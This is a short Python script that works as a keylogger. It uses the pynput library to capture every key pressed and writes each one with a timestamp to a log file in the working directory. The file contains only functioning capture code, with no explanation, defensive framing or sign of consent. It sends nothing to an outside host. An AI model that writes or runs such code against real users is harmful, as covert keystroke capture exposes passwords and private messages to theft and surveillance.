from getpass import getuser
from pynput.keyboard import Key,Listener
import logging
import os

a=os.getcwd()
log_dir=f"{a}/log/"

logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
